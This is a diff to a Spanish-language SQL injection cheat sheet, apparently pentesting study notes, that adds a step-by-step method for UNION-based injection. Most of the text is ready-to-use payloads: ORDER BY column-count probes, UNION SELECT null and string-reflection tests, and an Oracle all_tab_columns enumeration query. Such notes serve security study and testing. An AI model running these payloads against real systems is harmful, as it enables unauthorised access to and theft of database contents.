@@ -51,12 +51,26 @@ abc' or '1'='1
 ```sql
 ' union select null,column_name from all_tab_columns where table_name='NOMBRE DE LA TABLA'-- -
 ```
-## Determinar el numero de columnas
+## Metodologia (No blind SQL injection)
+### Determinar el numero de columnas
 ```sql
 abc' order by 3-- -
 # Respuesta 200 OK
 abc' order by 20 -- -
 # Respuesta 500 Internal Server Error
 ```
-Hay por lo menos 3 columnas y menos de 20, cambiar los numeros hasta determinar el numero de columnas
+Hay por lo menos 3 columnas y menos de 20, cambiar los numeros hasta determinar el numero de columnas. Una vez encontrado el numero iniciaremos una query union select.
 
+Supongamos que el numero de columnas reflejado es 4 primero lo confirmaremos de la siguiente forma
+```sql
+abc' union select null,null,null,null-- -
+```
+### Determinar los campos de los que se puede obtener informacion
+Ahora determinaremos cual de los 4 campos es de tipo cadena para poder hacer querys sobre ese campo, introduciremos una cadena aleatoria dentro de cada uno para ver cual es reflejado.
+```sql
+abc' union select 'v0ydRT',null,null,null-- - # 500
+abc' union select null,'v0ydRT',null,null-- - # 500
+abc' union select null,null,'v0ydRT',null-- - # 200 -> Aqui se pueden injectar querys
+abc' union select null,null,null,'v0ydRT'-- - # 500
+```
+Despues de eso se utiliza toda la informacion aterior para recopilar la informacion de la base de datos.
